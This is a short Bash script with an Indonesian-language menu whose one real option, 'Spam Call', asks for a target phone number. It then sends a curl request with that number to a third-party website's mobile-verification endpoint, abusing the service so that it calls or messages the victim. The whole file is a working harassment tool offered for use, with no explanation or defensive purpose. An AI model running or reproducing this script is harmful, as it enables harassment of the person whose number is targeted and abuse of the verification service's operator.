#!/bin/bash

clear
sleep 01
echo '
[1].Spam Call
[2].Exit
'
echo

read -p "Masukan Pilihan :" pil
if [[ $pil == 1 ]]; then
read -p "masukan nomor target :" nomor
link="https://id.jagreward.com/member/verify-mobile/$nomor"
curl -s $link
else
echo "Termikasih telah menggunakan tools ini"
exit
fi
echo ''